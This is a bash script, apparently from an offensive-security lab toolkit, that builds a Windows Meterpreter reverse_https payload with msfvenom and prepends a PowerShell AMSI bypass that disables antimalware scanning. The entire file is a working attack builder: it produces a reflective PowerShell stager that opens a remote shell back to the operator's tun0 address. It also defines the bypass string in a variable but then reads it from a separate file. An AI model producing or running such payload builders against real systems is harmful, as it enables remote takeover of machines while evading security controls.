#! /bin/bash
if [ $# -eq 0 ]
then
  echo "No port specified, defaulting to port 443"
  port="443"
else
  port=$1
fi

#get ip address of tun0
ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"

head='foreach($i in [Ref].Assembly.GetTypes()){if($i.Name -like "*iUtils"){$t=$i}};foreach($j in $t.GetFields("NonPublic,Static")){if($j.Name -like "*Context"){$f=$j}}; [IntPtr]$ctx=$f.GetValue($null); [Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ctx, 1);'
msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$port -f psh-reflection -o core.ps1


cat ./head.ps1 > payload.ps1
cat ./core.ps1 >> payload.ps1

echo "Finished, payload located at payload.ps1"
